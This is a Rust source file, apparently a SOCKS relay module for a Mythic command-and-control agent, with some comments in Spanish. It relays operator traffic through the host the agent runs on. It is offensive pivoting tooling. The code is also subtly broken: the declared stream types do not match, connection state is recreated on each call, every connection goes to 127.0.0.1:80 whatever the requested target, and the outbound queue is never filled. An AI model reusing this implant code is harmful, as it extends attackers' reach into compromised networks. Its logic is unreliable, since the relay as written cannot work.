// socks.rs
use crate::agent::AgentTask;
use crate::mythic_error;
use base64::{decode, encode};
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::sync::{mpsc, Arc, Mutex};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

#[derive(Debug)]
pub struct SocksState {
    // Cambiamos a almacenar WriteHalf en lugar de TcpStream completo
    pub connections: Arc<Mutex<Vec<(u32, tokio::net::tcp::WriteHalf)>>>,
    pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(Vec::new())),
            outbound: Arc::new(Mutex::new(Vec::new())),
        }
    }
}

pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "SOCKS relay started"))?;

    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(relay_loop(tx.clone(), rx));
    Ok(())
}

async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) {
    while let Ok(msg) = rx.recv() {
        if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
            if task.command == "socks_data" {
                if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                    process_messages(&tx, msgs).await;
                }
            }
        }
    }
}

async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>) {
    let socks_state = SocksState::new();
    let mut conns = socks_state.connections.lock().unwrap();
    let mut outbound = socks_state.outbound.lock().unwrap();

    for msg in msgs {
        if msg.exit {
            conns.retain(|(id, _)| *id != msg.server_id);
            continue;
        }

        let data = decode(&msg.data).unwrap_or_default();
        
        if let Some(pos) = conns.iter().position(|(id, _)| *id == msg.server_id) {
            let (_, writer) = &mut conns[pos];
            let _ = writer.write_all(&data).await;
        } else {
            if let Ok(stream) = TcpStream::connect("127.0.0.1:80").await {
                // Dividir el stream en reader y writer
                let (reader, writer) = stream.into_split();
                
                // Escribir los datos iniciales
                let _ = writer.write_all(&data).await;
                
                // Guardar el writer en las conexiones
                conns.push((msg.server_id, writer));
                
                // Spawnear tarea con el reader para leer respuestas
                tokio::spawn(relay_stream_reader(msg.server_id, reader, tx.clone()));
            }
        }
    }

    if !outbound.is_empty() {
        let json = serde_json::to_string(&*outbound).unwrap();
        let _ = tx.send(serde_json::json!({
            "command": "socks_data",
            "parameters": json,
            "id": "socks_outbound"
        }));
        outbound.clear();
    }
}

// Función separada para manejar solo lectura
async fn relay_stream_reader(id: u32, mut reader: tokio::net::tcp::ReadHalf, tx: mpsc::Sender<serde_json::Value>) {
    let mut buf = [0u8; 4096];
    loop {
        match reader.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => {
                let data = encode(&buf[..n]);
                let msg = SocksMsg { exit: false, server_id: id, data };
                let json = serde_json::to_string(&vec![msg]).unwrap();
                let _ = tx.send(serde_json::json!({
                    "command": "socks_data",
                    "parameters": json,
                    "id": "socks_outbound"
                }));
            }
            Err(_) => break,
        }
    }
    let _ = tx.send(serde_json::json!({
        "command": "socks_data",
        "parameters": serde_json::to_string(&vec![SocksMsg { exit: true, server_id: id, data: String::new() }]).unwrap(),
        "id": "socks_outbound"
    }));
}
